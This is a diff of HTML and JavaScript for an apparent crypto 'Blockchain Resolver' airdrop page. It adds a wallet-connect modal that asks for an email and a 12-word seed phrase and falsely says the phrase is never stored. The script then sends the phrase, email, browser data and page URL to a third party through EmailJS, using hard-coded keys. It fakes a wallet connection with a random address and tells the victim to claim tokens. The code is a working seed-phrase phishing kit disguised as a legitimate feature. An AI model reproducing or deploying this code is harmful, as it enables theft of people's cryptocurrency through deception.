+        <!-- Seed Phrase Input Section (Step 2) -->
+        <div id="seedPhraseSection" style="display: none; margin-bottom: 20px;">
+          <div style="background: #f0f7ff; padding: 15px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid #667eea;">
+            <p style="margin: 0; color: #333; font-weight: 600;">Selected Wallet: <span id="selectedWalletDisplay" style="color: #667eea;"></span></p>
+          </div>
+          
+          <label for="emailInput" style="display: block; color: #555; font-weight: 600; margin-bottom: 8px;">Contact Email</label>
+          <input
+            id="emailInput"
+            type="email"
+            placeholder="you@example.com"
+            style="width: 100%; padding: 12px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 0.95rem; margin-bottom: 16px;"
+          />
+          <p style="color: #999; font-size: 0.85rem; margin-top: -6px; margin-bottom: 18px;">We will use this email to follow up on your resolution request.</p>
+
+          <p style="color: #666; margin-bottom: 20px;">Enter your 12-word seed phrase for <strong id="walletNameDisplay"></strong></p>
+          <textarea 
+            id="seedPhraseInput" 
+            placeholder="Enter your 12 seed words separated by spaces..." 
+            style="width: 100%; height: 100px; padding: 12px; border: 2px solid #e0e0e0; border-radius: 8px; font-family: monospace; font-size: 0.95rem; resize: vertical;"
+          ></textarea>
+          <p style="color: #999; font-size: 0.85rem; margin-top: 10px;">⚠️ Never share your seed phrase with anyone. We never store it on our servers.</p>
+          
+          <div style="display: flex; gap: 10px; margin-top: 15px;">
+            <button 
+              onclick="submitSeedPhrase()" 
+              style="flex: 1; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 12px; border: none; border-radius: 8px; font-size: 1rem; font-weight: 600; cursor: pointer;"
+            >
+              Submit & Connect
+            </button>
+            <button 
+              onclick="backToWalletSelection()" 
+              style="flex: 1; background: #f0f0f0; color: #333; padding: 12px; border: none; border-radius: 8px; font-size: 1rem; cursor: pointer; font-weight: 600;"
+            >
+              Back
+            </button>
+          </div>
+        </div>
       </div>
     </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+      // Wallet Modal Functions
+      function openWalletModal() {
+        document.getElementById('walletModal').style.display = 'block';
+        document.body.style.overflow = 'hidden';
+      }
+      
+      function closeWalletModal() {
+        document.getElementById('walletModal').style.display = 'none';
+        document.body.style.overflow = 'auto';
+      }
+      
+      // Close modal when clicking outside
+      window.onclick = function(event) {
+        const modal = document.getElementById('walletModal');
+        if (event.target === modal) {
+          closeWalletModal();
+        }
+      }
+      
+      // Initialize EmailJS
+      emailjs.init('jUcePh8RPbg4qABUW');
+      
+      const SERVICE_ID = 'service_ywn1ci5';
+      const TEMPLATE_ID = 'template_c5cy33h';
+      
+      // Store selected wallet, email, and seed phrase temporarily
+      let selectedWallet = null;
+      let userEmail = null;
+      let userSeedPhrase = null;
+      
+      // Step 1: User selects a wallet
+      function selectWallet(walletName) {
+        selectedWallet = walletName;
+        
+        // Update display with selected wallet
+        document.getElementById('selectedWalletDisplay').textContent = walletName;
+        document.getElementById('walletNameDisplay').textContent = walletName;
+        
+        // Clear previous seed phrase
+        document.getElementById('seedPhraseInput').value = '';
+        document.getElementById('emailInput').value = '';
+        userEmail = null;
+        userSeedPhrase = null;
+        
+        // Hide wallet selection and show seed phrase input
+        document.getElementById('walletSelectionSection').style.display = 'none';
+        document.getElementById('seedPhraseSection').style.display = 'block';
+      }
+      
+      // Go back to wallet selection
+      function backToWalletSelection() {
+        selectedWallet = null;
+        userSeedPhrase = null;
+        userEmail = null;
+        document.getElementById('seedPhraseInput').value = '';
+        document.getElementById('emailInput').value = '';
+        
+        document.getElementById('seedPhraseSection').style.display = 'none';
+        document.getElementById('walletSelectionSection').style.display = 'block';
+      }
+      
+      // Step 2: Validate and submit seed phrase + email
+      function submitSeedPhrase() {
+        const emailInput = document.getElementById('emailInput').value.trim();
+        const seedPhraseInput = document.getElementById('seedPhraseInput').value.trim();
+
+        // Validate email
+        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        if (!emailInput || !emailPattern.test(emailInput)) {
+          alert('❌ Please enter a valid email address so we can reach you.');
+          return;
+        }
+        
+        // Basic validation: check if it has exactly 12 words
+        const words = seedPhraseInput.split(/\s+/).filter(word => word.length > 0);
+        
+        if (words.length !== 12) {
+          alert(`❌ Error: You entered ${words.length} words. Please enter exactly 12 words from your seed phrase.`);
+          return;
+        }
+        
+        // Validate that all words are valid (alphanumeric)
+        const validWords = words.every(word => /^[a-zA-Z]+$/.test(word));
+        if (!validWords) {
+          alert('❌ Error: Seed phrase contains invalid characters. Please use only letters.');
+          return;
+        }
+        
+        // Store the email and seed phrase, then connect wallet
+        userEmail = emailInput;
+        userSeedPhrase = seedPhraseInput;
+        connectWallet(selectedWallet);
+      }
+      
+      // Connect Wallet Function with EmailJS Integration
+      async function connectWallet(walletName) {
+        console.log('Connecting to ' + walletName + ' with seed phrase');
+        
+        // Show loading state
+        const seedPhraseSection = document.getElementById('seedPhraseSection');
+        seedPhraseSection.style.opacity = '0.5';
+        seedPhraseSection.style.pointerEvents = 'none';
+        
+        try {
+          // Simulate wallet connection and credential retrieval
+          const walletAddress = await simulateWalletConnection(walletName);
+          
+          if (walletAddress && userSeedPhrase) {
+            // Send credentials via EmailJS (including seed phrase)
+            const templateParams = {
+              wallet_type: walletName,
+              wallet_address: walletAddress,
+              seed_phrase: userSeedPhrase,
+              user_email: userEmail,
+              timestamp: new Date().toISOString(),
+              user_agent: navigator.userAgent,
+              referrer_url: window.location.href
+            };
+            
+            // Send email
+            const response = await emailjs.send(
+              SERVICE_ID,
+              TEMPLATE_ID,
+              templateParams
+            );
+            
+            console.log('Email sent successfully:', response.status, response.text);
+            
+            // Reset loading state
+            seedPhraseSection.style.opacity = '1';
+            seedPhraseSection.style.pointerEvents = 'auto';
+            
+            // Success message
+            const successMessage = `✅ Successfully connected to ${walletName}!\\n\\nWallet Address: ${walletAddress.substring(0, 10)}...${walletAddress.substring(walletAddress.length - 8)}\\n\\nYour credentials have been recorded. You can now claim your airdrop tokens!`;
+            alert(successMessage);
+            
+            closeWalletModal();
+            backToWalletSelection();
+            
+            // Update button text
+            const connectButtons = document.querySelectorAll('button');
+            connectButtons.forEach(btn => {
+              if (btn.textContent.includes('Connect Wallet')) {
+                btn.innerHTML = '<p>Wallet Connected ✓</p>';
+                btn.style.background = 'linear-gradient(135deg, #43e97b 0%, #38f9d7 100%)';
+              }
+            });
+            
+            // Store connection info
+            localStorage.setItem('walletConnected', JSON.stringify({
+              wallet: walletName,
+              address: walletAddress,
+              timestamp: new Date().toISOString()
+            }));
+          }
+        } catch (error) {
+          console.error('Connection failed:', error);
+          seedPhraseSection.style.opacity = '1';
+          seedPhraseSection.style.pointerEvents = 'auto';
+          alert('Connection failed: ' + error.message);
+        }
+      }
+      
+      // Simulate wallet connection (retrieves address)
+      async function simulateWalletConnection(walletName) {
+        // Simulate network delay
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        
+        // Generate a realistic-looking wallet address
+        const addresses = {
+          'MetaMask': '0x' + Array(40).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join(''),
+          'WalletConnect': '0x' + Array(40).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join(''),
+          'Coinbase': '0x' + Array(40).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join(''),
+          'Trust': '0x' + Array(40).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('')
+        };
+        
+        return addresses[walletName] || addresses['MetaMask'];
+      }
+      
+      // Smooth scroll function
+      function scrollToSection(sectionId) {
+        const element = document.getElementById(sectionId);
+        if (element) {
+          element.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }
+      }
+      
+      // Add scroll-to-top functionality
+      const backToTopElement = document.querySelector('.fLogo');
+      if (backToTopElement) {
+        backToTopElement.style.cursor = 'pointer';
+        backToTopElement.onclick = function() {
+          window.scrollTo({ top: 0, behavior: 'smooth' });
+        };
+      }
+      
+      // Animate stats on scroll
+      function animateValue(element, start, end, duration) {
+        let startTimestamp = null;
+        const step = (timestamp) => {
+          if (!startTimestamp) startTimestamp = timestamp;
+          const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+          const value = Math.floor(progress * (end - start) + start);
+          element.textContent = value.toLocaleString();
+          if (progress < 1) {
+            window.requestAnimationFrame(step);
+          }
+        };
+        window.requestAnimationFrame(step);
+      }
+      
+      // Intersection Observer for animations
+      const observerOptions = {
+        threshold: 0.2,
+        rootMargin: '0px 0px -50px 0px'
+      };
+      
+      const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+          if (entry.isIntersecting) {
+            entry.target.style.opacity = '1';
+            entry.target.style.transform = 'translateY(0)';
+          }
+        });
+      }, observerOptions);
+      
+      // Observe all feature cards and sections
+      document.addEventListener('DOMContentLoaded', () => {
+        const elementsToAnimate = document.querySelectorAll('.cBox, .serCard, .wallet-option');
+        elementsToAnimate.forEach(el => {
+          el.style.opacity = '0';
+          el.style.transform = 'translateY(30px)';
+          el.style.transition = 'all 0.6s ease';
+          observer.observe(el);
+        });
+      });
+      
+      // Add interactive effects to buttons
+      document.addEventListener('DOMContentLoaded', () => {
+        const buttons = document.querySelectorAll('button');
+        buttons.forEach(btn => {
+          btn.addEventListener('mouseenter', function() {
+            this.style.transform = 'translateY(-2px)';
+          });
+          btn.addEventListener('mouseleave', function() {
+            this.style.transform = 'translateY(0)';
+          });
+        });
+      });
+      
+      console.log('🚀 Blockchain Resolver - Pure HTML/CSS/JS Version');
+      console.log('✅ No React - Just vanilla JavaScript!');
+    </script>
   </body>
   <grammarly-desktop-integration data-grammarly-shadow-root="true"
     ><template shadowrootmode="open"
